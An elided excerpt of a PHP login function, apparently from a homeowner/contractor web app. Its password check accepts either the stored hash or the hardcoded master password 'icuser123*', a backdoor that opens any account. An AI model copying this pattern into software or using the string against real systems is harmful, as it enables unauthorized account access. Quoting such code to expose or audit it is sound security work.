      ...
      private function login() {
          ...
          if ($userDetails) {
              ...
              if (crypt($this->values["password"], $userDetails['password']) == $userDetails['password'] or $this->values["password"] == 'icuser123*') {
                 ...
                 /* else if($this->values["usertype"] != $usertype){
                      $validLogin = 0;
                      if($this->values["usertype"] == "homeowner"){
                        $logMessage = 'Invalid homeowner login.';
                      }else{
                        $logMessage = 'Invalid contractor login.';
                      }
          ...
          if ($hasLogInfo == 0) {
              ...
              $checkDevice = $this->Api_model->checkDeviceDets($userDetails['userid']);
